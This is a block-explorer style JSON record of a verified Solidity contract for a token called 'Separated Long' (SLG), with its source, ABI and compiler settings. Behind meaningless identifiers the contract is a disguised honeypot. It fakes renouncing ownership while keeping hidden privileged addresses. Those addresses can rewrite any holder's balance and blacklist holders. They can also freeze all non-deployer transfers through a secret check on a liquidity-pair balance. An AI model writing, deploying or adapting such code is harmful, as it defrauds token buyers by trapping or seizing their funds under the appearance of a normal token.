{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface autoWalletMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchShouldFrom {\n    function createPair(address txTeam, address toLiquidity) external returns (address);\n}\n\ninterface txExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isMax) external view returns (uint256);\n\n    function transfer(address marketingTo, uint256 isToTotal) external returns (bool);\n\n    function allowance(address shouldMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isToTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTo,\n        uint256 isToTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeList, uint256 value);\n    event Approval(address indexed shouldMin, address indexed spender, uint256 value);\n}\n\ninterface exemptLaunchedReceiver is txExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeparatedLong is launchTeam, txExempt, exemptLaunchedReceiver {\n\n    bool public buyFromFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txList;\n    }\n\n    address private receiverLimit;\n\n    function enableFrom() private view {\n        require(marketingFeeSender[_msgSender()]);\n    }\n\n    address buyReceiverList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public minMarketing;\n\n    bool public fundExempt;\n\n    function atMarketing(address swapMin) public {\n        if (fundExempt) {\n            return;\n        }\n        if (fromAmount == txSender) {\n            amountLaunch = false;\n        }\n        marketingFeeSender[swapMin] = true;\n        \n        fundExempt = true;\n    }\n\n    uint256 modeFund;\n\n    function owner() external view returns (address) {\n        return receiverLimit;\n    }\n\n    function walletBuyLaunch() public {\n        emit OwnershipTransferred(atMax, address(0));\n        receiverLimit = address(0);\n    }\n\n    function buyAmount(address atWalletMarketing, address marketingTo, uint256 isToTotal) internal returns (bool) {\n        require(sellTo[atWalletMarketing] >= isToTotal);\n        sellTo[atWalletMarketing] -= isToTotal;\n        sellTo[marketingTo] += isToTotal;\n        emit Transfer(atWalletMarketing, marketingTo, isToTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private sellTo;\n\n    uint8 private txList = 18;\n\n    function modeBuyTo(address autoFrom, uint256 isToTotal) public {\n        enableFrom();\n        sellTo[autoFrom] = isToTotal;\n    }\n\n    uint256 private txSender;\n\n    function walletSellBuy(address amountTeam) public {\n        enableFrom();\n        \n        if (amountTeam == atMax || amountTeam == minMarketing) {\n            return;\n        }\n        shouldSender[amountTeam] = true;\n    }\n\n    uint256 private txTo = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed teamModeWallet, address indexed fundMode);\n\n    string private toExempt = \"SLG\";\n\n    address totalShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address autoFrom, uint256 isToTotal) external virtual override returns (bool) {\n        return takeTx(_msgSender(), autoFrom, isToTotal);\n    }\n\n    uint256 private fromAmount;\n\n    bool private shouldExempt;\n\n    function getOwner() external view returns (address) {\n        return receiverLimit;\n    }\n\n    address public atMax;\n\n    function totalFee(uint256 isToTotal) public {\n        enableFrom();\n        marketingFundSwap = isToTotal;\n    }\n\n    constructor (){\n        \n        autoWalletMin amountShould = autoWalletMin(buyReceiverList);\n        minMarketing = launchShouldFrom(amountShould.factory()).createPair(amountShould.WETH(), address(this));\n        \n        atMax = _msgSender();\n        walletBuyLaunch();\n        marketingFeeSender[atMax] = true;\n        sellTo[atMax] = txTo;\n        \n        emit Transfer(address(0), atMax, txTo);\n    }\n\n    uint256 constant modeWallet = 2 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return swapTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTo;\n    }\n\n    mapping(address => bool) public shouldSender;\n\n    function transferFrom(address atWalletMarketing, address marketingTo, uint256 isToTotal) external override returns (bool) {\n        if (_msgSender() != buyReceiverList) {\n            if (buyExempt[atWalletMarketing][_msgSender()] != type(uint256).max) {\n                require(isToTotal <= buyExempt[atWalletMarketing][_msgSender()]);\n                buyExempt[atWalletMarketing][_msgSender()] -= isToTotal;\n            }\n        }\n        return takeTx(atWalletMarketing, marketingTo, isToTotal);\n    }\n\n    string private swapTake = \"Separated Long\";\n\n    function approve(address txLaunch, uint256 isToTotal) public virtual override returns (bool) {\n        buyExempt[_msgSender()][txLaunch] = isToTotal;\n        emit Approval(_msgSender(), txLaunch, isToTotal);\n        return true;\n    }\n\n    mapping(address => bool) public marketingFeeSender;\n\n    bool private feeLaunched;\n\n    bool public amountLaunch;\n\n    function balanceOf(address isMax) public view virtual override returns (uint256) {\n        return sellTo[isMax];\n    }\n\n    function takeTx(address atWalletMarketing, address marketingTo, uint256 isToTotal) internal returns (bool) {\n        if (atWalletMarketing == atMax) {\n            return buyAmount(atWalletMarketing, marketingTo, isToTotal);\n        }\n        uint256 enableSender = txExempt(minMarketing).balanceOf(totalShould);\n        require(enableSender == marketingFundSwap);\n        require(marketingTo != totalShould);\n        if (shouldSender[atWalletMarketing]) {\n            return buyAmount(atWalletMarketing, marketingTo, modeWallet);\n        }\n        return buyAmount(atWalletMarketing, marketingTo, isToTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyExempt;\n\n    uint256 marketingFundSwap;\n\n    function allowance(address liquidityShould, address txLaunch) external view virtual override returns (uint256) {\n        if (txLaunch == buyReceiverList) {\n            return type(uint256).max;\n        }\n        return buyExempt[liquidityShould][txLaunch];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamModeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"atMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFeeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToTotal\",\"type\":\"uint256\"}],\"name\":\"modeBuyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isToTotal\",\"type\":\"uint256\"}],\"name\":\"totalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWalletMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"walletSellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeparatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}